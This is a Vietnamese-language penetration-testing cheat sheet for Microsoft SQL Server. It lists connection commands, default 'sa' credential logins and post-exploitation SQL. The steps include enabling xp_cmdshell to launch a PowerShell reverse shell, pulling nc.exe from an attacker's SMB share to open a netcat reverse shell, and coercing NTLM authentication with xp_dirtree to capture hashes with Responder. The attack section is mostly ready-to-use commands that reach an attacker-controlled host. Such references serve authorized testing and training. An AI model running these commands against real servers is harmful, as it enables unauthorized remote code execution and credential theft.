# MSSQL (Port 1433)

## Connect

### sqlcmd

Kết nối tới máy chủ MSSQL từ xa với thông tin đăng nhập:

```
sqlcmd -S <ip> -U <username> -P
```

### mssqlclient.py

Sử dụng Impacket’s mssqlclient.py để kết nối với xác thực Windows:

```
python3 mssqlclient.py <username>:<password>@<ip> -windows-auth
```

### URL

Sử dụng chuỗi kết nối JDBC/ODBC để truy cập cơ sở dữ liệu từ xa:

```
jdbc:sqlserver://<ip>:1433;databaseName=<db>;user=<username>;password=<password>
```

***

## Attack Vectors

### Đăn nhập ẩn danh

Thử đăng nhập với tài khoản mặc định `sa` không có mật khẩu hoặc mật khẩu yếu:

```
sqlcmd -S <ip> -U sa -P ''
```

### Đăng nhập với thông tin mặc định

Thử các tài khoản/mật khẩu phổ biến như `sa` với `admin`, `password`:

```
sqlcmd -S <ip> -U sa -P admin
```

***

## Post-Exploitation

### Các lệnh MSSQL thông dụng

<table><thead><tr><th width="439">Command</th><th width="190">Description</th></tr></thead><tbody><tr><td>SELECT name FROM sys.databases;</td><td>Liệt kê database</td></tr><tr><td>SELECT table_name FROM information_schema.tables;</td><td>Liệt kê bảng</td></tr><tr><td>SELECT name FROM sys.sql_logins;</td><td>Liệt kê user</td></tr><tr><td>select IS_SRVROLEMEMBER ('sysadmin')</td><td>Check quyền của user</td></tr><tr><td>xp_dirtree \</td><td>Liệt kê file cần xem</td></tr></tbody></table>

### Thực thi mã từ xa qua xp\_cmdshell

Kích hoạt và sử dụng xp\_cmdshell để thực thi lệnh hệ thống:

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'powershell -c "<reverse_shell>"';
```

### Thực thi Reverse Shell

Sao chép và chạy netcat để tạo reverse shell:

```
EXEC xp_cmdshell 'copy \\<your_ip>\gabbar\nc.exe %temp%\nc.exe';
EXEC xp_cmdshell '%temp%\nc.exe -e cmd.exe <your_ip> <your_port>';
```

### Bắt hàm băm NTLM

Buộc MSSQL xác thực với SMB share giả mạo để bắt hàm băm NTLM:

```
EXEC MASTER.sys.xp_dirtree '\\<your_ip>\test', 1, 1;
```

Chạy Responder trên máy tấn công:

```
sudo responder -I tun0 -v
```